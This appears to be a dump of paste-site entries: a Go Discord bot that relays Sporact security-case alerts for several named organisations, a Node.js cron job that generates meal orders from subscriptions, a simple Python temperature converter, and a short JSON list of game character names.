	//Mendefinisikan mapping antara ID tenant dengan nama mereka. Ini digunakan untuk mengidentifikasi tenant dalam notifikasi.
	mapTenatID = map[int]string{
		6:  ""Kementerian Komunikasi dan Informatika"",
		10: ""Mandiri Investasi"",
		5:  ""Mandiri Sekuritas"",
		17: ""Pelindo"",
		20: ""PT Samuel Sekuritas Indonesia"",
		21: ""PT Bukit Asam"",
		22: ""ASDP Indonesia Ferry"",
	}

	//ctx = context.Background()
)

// GetAlertSporact Struct yang digunakan untuk mengatur sesi Discord, informasi klien API untuk mengambil peringatan, dan beberapa konfigurasi lainnya.
type GetAlertSporact struct {
	Session      *discordgo.Session
	ChannelID    string
	Scheduler    string
	AccessToken  string
	RefreshToken string
	LastAccessID int
	Client       *sporact.Client
}

// Response Struct untuk menampung respons dari API peringatan, termasuk detail kasus seperti ID, judul, deskripsi, dan lainnya.
type Response struct {
	Id          int    `json:""id""`
	CaseID      string `json:""case_id""`
	Title       string `json:""title""`
	Description string `json:""description""`
	Status      string `json:""status""`
	Priority    string `json:""priority""`
	Impact      string `json:""impact""`
	Tenant      string `json:""tenant""`
}

// initJsonManager Menginisialisasi manajer JSON untuk membaca dan menulis konfigurasi.
func (job *GetAlertSporact) initJsonManager() *JsonParser.JSONManager {
	//get file config.json
	getwd, err := os.Getwd()

	if err != nil {
		return nil
	}

	return JsonParser.NewJSONManager(getwd + ""/config.json"")
}

// NewGetAlertSporact Membuat instance GetAlertSporact baru dengan menginisialisasi sesi Discord, ID channel, scheduler, token akses, dan klien API berdasarkan konfigurasi yang dibaca dari config.json.
func NewGetAlertSporact(session *discordgo.Session, channelID string, scheduler string) *GetAlertSporact {
	var config config2.Config

	//init json manager
	manager := new(GetAlertSporact).initJsonManager()

	//read config.json
	jsonConfig, err := manager.Read(config)
	if err != nil {
		log.Printf(""line 67 error: %v"", err)
		return nil
	}

	//return jsonConfig map[access_key: last_case_id:0 refresh_key:]
	mapConfig, ok := jsonConfig.(map[string]interface{})
	if !ok {
		log.Printf(""line 74 error: %v"", err)
		return nil
	}

	//get access key
	accessKeyValue, ok := mapConfig[""access_key""].(string)
	if !ok {
		log.Printf(""error: %v"", err)
		return nil
	}

	//get refresh key
	refreshKeyValue, ok := mapConfig[""refresh_key""].(string)
	if !ok {
		log.Printf(""error: %v"", err)
		return nil
	}

	//get last case id
	lastCaseIDValue, ok := mapConfig[""last_case_id""].(float64)

	//set config
	config.AccessKey = accessKeyValue
	config.RefreshKey = refreshKeyValue
	config.LastCaseID = int(lastCaseIDValue)

	//new http sporact
	client := sporact.NewClient(config.AccessKey)

	//return GetAlertSporact
	return &GetAlertSporact{
		Session:      session,
		ChannelID:    channelID,
		Scheduler:    scheduler,
		AccessToken:  config.AccessKey,
		RefreshToken: config.RefreshKey,
		Client:       client,
		LastAccessID: config.LastCaseID,
	}
}

// Schedule mendefinisikan waktu berjalannya cron job
func (job *GetAlertSporact) Schedule() string {
	return job.Scheduler
}

// Task adalah fungsi yang akan dijalankan oleh cron job. Fungsi ini akan memproses data dari API peringatan, mengirim notifikasi ke Discord, dan memainkan alarm jika ada kasus baru yang masuk.
func (job *GetAlertSporact) Task() {
	data, err := job.ProcessData()

	if err != nil {
		log.Printf(""line 119 error: %v"", err)
		return
	}

	if data.Id == job.LastAccessID {
		log.Printf(""cron job success"")
		return
	}

	title := fmt.Sprintf(""🚨 **Aktivitas Mencurigakan Terdeteksi** 🚨\n\n"")
	title += fmt.Sprintf(""Case ID: %s - %s\n"", data.CaseID, data.Tenant)
	title += fmt.Sprintf(""Workbench: %s\n"", data.Title)

	if err != nil {
		log.Printf(""line 141 error: %v"", err)
		return
	}

	embeb := &discordgo.MessageEmbed{
		Title:       title,
		Description: fmt.Sprintf(""Ini merupakan notifikasi untuk case baru yang masuk ke sporact""),
		Fields: []*discordgo.MessageEmbedField{

			{
				Name:   ""Status"",
				Value:  data.Status,
				Inline: false,
			},

			{
				Name:   ""Prioritas"",
				Value:  fmt.Sprintf(""%s - %s"", data.Priority, data.Impact),
				Inline: false,
			},

			{
				Name:  ""Link"",
				Value: fmt.Sprintf(""https://sporact.mii.co.id/cases/%s"", data.CaseID),
			},
		},
		Color: getColorByPriority(data.Impact),
	}

	_, err = job.Session.ChannelMessageSendComplex(job.ChannelID, &discordgo.MessageSend{
		Embed: embeb,
	})

	if err != nil {
		log.Printf(""line 178 error: %v"", err)
	}

	job.LastAccessID = data.Id

	//write config.json
	err = job.WriteJson(data)

	if err != nil {
		log.Printf(err.Error())
		return
	}

	log.Printf(""cron job success"")

	err = job.PlayAlarm()
	if err != nil {
		log.Printf(""line 186 error: %v"", err)
		return
	}

	return
}

// PlayAlarm memainkan alarm jika ada kasus baru yang masuk.
func (job *GetAlertSporact) PlayAlarm() (err error) {
	//get file config.json
	getwd, err := os.Getwd()

	if err != nil {
		return err
	}

	f, err := os.Open(getwd + ""/etc/1.mp3"")

	if err != nil {
		return err
	}

	streamer, format, err := mp3.Decode(f)

	if err != nil {
		return err
	}

	defer streamer.Close()

	speaker.Init(format.SampleRate, format.SampleRate.N(time.Second/10))

	done := make(chan bool)
	speaker.Play(beep.Seq(streamer, beep.Callback(func() {
		done <- true
	})))

	<-done

	return err
}

// ProcessData memproses data dari API Sporact.
func (job *GetAlertSporact) ProcessData() (Response, error) {
	res, err := job.GetAlertCaseApi()

	if err != nil {
		return Response{}, fmt.Errorf(""error: %v"", err)
	}

	mapData := res.Get(""results.0"")

	respStruct := Response{
		Id:          int(mapData.Get(""id"").Int()),
		CaseID:      mapData.Get(""uid"").String(),
		Title:       mapData.Get(""title"").String(),
		Description: mapData.Get(""description"").String(),
		Status:      mapData.Get(""status_display"").String(),
		Priority:    mapData.Get(""priority.name"").String(),
		Impact:      mapData.Get(""impact_details.name"").String(),
		Tenant:      mapTenatID[int(mapData.Get(""tenant_id"").Int())],
	}

	return respStruct, nil
}

// GetAlertCaseApi gets the alert case from Sporact MII API.
func (job *GetAlertSporact) GetAlertCaseApi() (*fetch.Response, error) {
	// Get current time and yesterday
	now := time.Now()
	yesterday := now.Add(-24 * time.Hour)

	// Formatting the times in the required format
	nowFormatted := now.Format(""2006-01-02T15:04:05.000Z"")
	yesterdayFormatted := yesterday.Format(""2006-01-02T15:04:05.000Z"")

	//construct url
	// Base URL
	baseURL := ""/cases/case/""

	// Parameters
	params := url.Values{}
	params.Add(""date[]"", yesterdayFormatted)
	params.Add(""date[]"", nowFormatted)
	params.Add(""range_type"", ""created___range"")
	params.Add(""status"", ""Open"")
	params.Add(""tenant"", ""6,10,5,17,20,21,22"")
	params.Add(""expand"", ""priority"")

	// Constructing the URL
	fullURL := baseURL + ""?"" + params.Encode()

	res, err := job.Client.MakeGetRequest(fullURL)

	if err != nil {
		return nil, fmt.Errorf(""error: %v"", err)
	}

	if res.StatusCode() == 401 {
		err = job.refreshToken()
		if err != nil {
			return nil, fmt.Errorf(""error: %v"", err)
		}

		job.Client = sporact.NewClient(job.AccessToken)

		log.Printf(""refresh token success"")

		return job.GetAlertCaseApi()
	}

	if res.StatusCode() != 200 {
		return nil, fmt.Errorf(""http status code: %d message: %s"", res.StatusCode(), res.Get(""message"").String())
	}

	return res, nil
}

// refreshToken refreshes the access token if expired.
func (job *GetAlertSporact) refreshToken() error {
	body := map[string]interface{}{
		""refresh"": job.RefreshToken,
	}

	resp, err := job.Client.MakePostRequest(""/auth/token/refresh/"", body)

	if err != nil {
		return fmt.Errorf(""error: %v"", err)
	}

	if resp.StatusCode() != 200 {
		return fmt.Errorf(""http status code: %d message: %s"", resp.StatusCode(), resp.Get(""message"").String())
	}

	//set new access token
	job.AccessToken = resp.Get(""access"").String()

	return nil
}

// WriteJson writes the response to the config.json file.
func (job *GetAlertSporact) WriteJson(response Response) error {
	jsonManager := job.initJsonManager()

	config := config2.Config{
		AccessKey:  job.AccessToken,
		RefreshKey: job.RefreshToken,
		LastCaseID: response.Id,
	}

	//write config.json
	return jsonManager.Write(config)
}

// getColorByPriority returns the color code based on the priority.
func getColorByPriority(priority string) int {
	switch priority {
	case ""High"":
		return 0xFF0000 // Merah
	case ""Medium"":
		return 0xFFFF00 // Kuning
	case ""Low"":
		return 0x00FF00 // Hijau
	default:
		return 0x808080 // Abu-abu untuk prioritas tidak dikenal
	}
}
"
kexZXJXE,Untitled,shahariar007,JavaScript,Wednesday 7th of February 2024 02:16:37 AM CDT,"const { CustomerModel } = require(""../customer/customer.model"");
const { connection } =
  require(""../../common/services/mongoose.service"").mongoose;
const {
  MealOrderModel,
  createMealOrder,
} = require(""../mealOrder/mealOrder.model"");

const cron = require(""node-cron"");
const { Expo } = require(""expo-server-sdk"");

// Schedule the function to run every 1 minutes
cron.schedule(""*/1 * * * *"", () => {
  console.log(""Running fetchValidSubscriptions..."");
  fetchValidSubscriptions();
});

const { SubscriptionModel } = require(""../subscription/subscription.model"");
const { UsersModel } = require(""../users/users.model"");
const { KitchenModel } = require(""../kitchen/kitchen.model"");
const envConfig = require(""../../common/config/env.config"");
const pushNotification = require(""../../common/functions/pushNotification"");

// const messageBody = ""Meal request has been received."";
// pushNotification(messageBody);
let sequentialNumber = 0;
const checkDataExists = async (mealOrderData) => {
  try {
    const existingData = await MealOrderModel.findOne({
      customerId: mealOrderData.customerId,
      item: mealOrderData.item,
      session: mealOrderData.session,
    });

    if (existingData) {
      // Data already exists in MongoDB
      console.log(""Data already exists"");
      return true;
    } else {
      // Data does not exist in MongoDB
      console.log(""Data does not exist"");
      return false;
    }
  } catch (error) {
    console.error(""Error occurred while checking data:"", error);
    return false;
  }
};

const checkAndCreateMealOrder = async (mealOrderData) => {
  const dataExists = await checkDataExists(mealOrderData);
  if (!dataExists) {
    try {
      const invoicePrefix = ""INV"";
      const generatedInvoiceNumber = await generateInvoiceNumber(invoicePrefix);
      mealOrderData.invoiceNo = generatedInvoiceNumber;
      const r = await createMealOrder(mealOrderData);
      const userID = mealOrderData.customerId;
      const userToken = await UsersModel.findOne({ _id: userID }).select(
        ""pushTokens""
      );
      const messageBody = ""Meal request has been received."";
      pushNotification(messageBody, userToken.pushTokens);
      console.log(""Meal order created successfully"", r);
    } catch (error) {
      console.error(""Error occurred while creating meal order:"", error);
    }
  }
};

const generateInvoiceNumber = async (prefix) => {
  const currentTime = new Date();
  const year = currentTime.getFullYear() % 100; //year last two digit
  const hours = currentTime.getHours();
  const minutes = currentTime.getMinutes();
  try {
    sequentialNumber++;
    const invoiceNumber = `${prefix}-${year}${hours}${minutes}-${sequentialNumber}`;
    // console.log({ invoiceNumber });
    return invoiceNumber;
  } catch (error) {
    console.error(error);
  }
};

const fetchCustomerInfo = async (customerId) => {
  try {
    // const user = await CustomerModel.findOne({ _id: customerId });
    const user = await UsersModel.findOne({ _id: customerId });
    return user;
  } catch (error) {
    console.log(error);
  }
};

const findNearestKitchen = async (deliveryAddress) => {
  const { coordinates } = deliveryAddress.geoTag;
  const [longitude, latitude] = coordinates;
  try {
    const nearestKitchen = await KitchenModel.findOne({
      ""address.geoTag"": {
        $near: {
          $geometry: {
            type: ""Point"",
            coordinates: [longitude, latitude], // Note: order is longitude, latitude for GeoJSON
          },
          $maxDistance: 50000000,
        },
      },
    }).exec();

    // console.log({ nearestKitchen });
    return nearestKitchen;
  } catch (err) {
    console.error(""Error finding nearest kitchen:"", err);
    return null;
  }
};

const fetchValidSubscriptions = async () => {
  try {
    const currentTime = new Date();
    const forNextHours = 36;
    const expirationTime = new Date(Date.now() + forNextHours * 60 * 60 * 1000);
    const subscription = await SubscriptionModel.find({
      endDate: {
        $gte: currentTime,
        $lte: expirationTime,
      },
      status: ""Active"",
    });
    // console.log(
    //   ""🚀 ~ file: cronJob.js:120 ~ fetchValidSubscriptions ~ subscription:"",
    //   subscription
    // );

    const lastInvoice = await MealOrderModel.findOne(
      {},
      {},
      { sort: { createAt: -1 } }
    );

    if (lastInvoice) {
      const lastInvoiceNumber = lastInvoice.invoiceNo;
      const lastSequentialNumber = parseInt(lastInvoiceNumber.split(""-"")[2]);
      sequentialNumber = lastSequentialNumber;
    } else {
      sequentialNumber = 0;
    }

    // console.log(""Total current meal:"", subscription.length);
    const sessionHours = {
      breakfast: { hours: 6, minutes: 0, seconds: 0 },
      lunch: { hours: 12, minutes: 0, seconds: 0 },
      dinner: { hours: 19, minutes: 0, seconds: 0 },
    };

    if (subscription.length) {
      for (const s of subscription) {
        // const subscriptionId = s.id;
        for (const p of s.subPlans) {
          const { item, session, quantity, updateAt } = p;
          const { customerId, deliveryAddress, subscriptionId } = s;
          const mealTime = new Date();
          const { hours, minutes, seconds } = sessionHours[session];
          mealTime.setHours(hours, minutes, seconds);

          const customer = await fetchCustomerInfo(customerId);
          const nearestKitchen = await findNearestKitchen(deliveryAddress);
          // console.log({ kitchen });
          console.log({ s });
          const mealOrderData = {
            subscriptionId,
            customerId,
            customerName: customer.firstName + "" "" + customer.lastName,
            item,
            session,
            orderDate: Date(updateAt),
            deliveryDate: mealTime,
            deliveryAddress,
            Instruction: ""N/A"",
            location: ""N/A"",
            orderType: ""N/A"",
            status: ""pending"",
            invoiceNo: ""N/A"", // insert invoiceNo in checkAndCreateMealOrder function
            totalAmount: item.price * quantity,
            customerEmail: customer.email,
            customerPhone: customer.mobile,
            quantity,
            kitchen: nearestKitchen,
            createBy: ""automate"",
            createAt: new Date(),
          };
          // console.log({ mealOrderData });
          checkAndCreateMealOrder(mealOrderData);
        }
      }
    } else {
      console.log(`No Meal Available in Next ${forNextHours} hours`);
    }
  } catch (error) {
    console.error(""Error fetching valid subscriptions:"", error);
  }
};

exports.a = fetchValidSubscriptions;"
0S7KzB1M,Convertir Grados ºC / ºF Simple Python,JPablos,Python,Wednesday 7th of February 2024 01:43:00 AM CDT,"""""""
Convertir grados Farenheit a Celsius
Convertir grados Celsius a Farenheit
""""""

def fahrenheit_a_celsius(_fah):
    """"""Convertir grados Farenheit a Celsius""""""
    return (_fah - 32) / 1.8

# Modo de uso
_fah = float(input(""Ingresa los grados Fahrenheit: ""))
_cel = format(fahrenheit_a_celsius(_fah), '.2f')
print(f""Los {_fah} grados Fahrenheit son {_cel} grados Celsius"")


def celsius_a_fahrenheit(_cel):
    """"""Convertir grados Celsius a Farenheit""""""
    return (_cel * 1.8) + 32

# Modo de uso
_cel = float(input(""Ingresa los grados Celsius: ""))
_fah = format(celsius_a_fahrenheit(_cel), '.2f')
print(f""Los {_cel} grados Celsius son {_fah} grados Fahrenheit"")
"
qyNqhy8R,!break,palmtreetop,JSON,Wednesday 7th of February 2024 01:24:23 AM CDT,"[`manon`,
`kimberly`,
`luke`,
`lily`,
`chun-li`,
`juri`,
`A.K.I.`]"
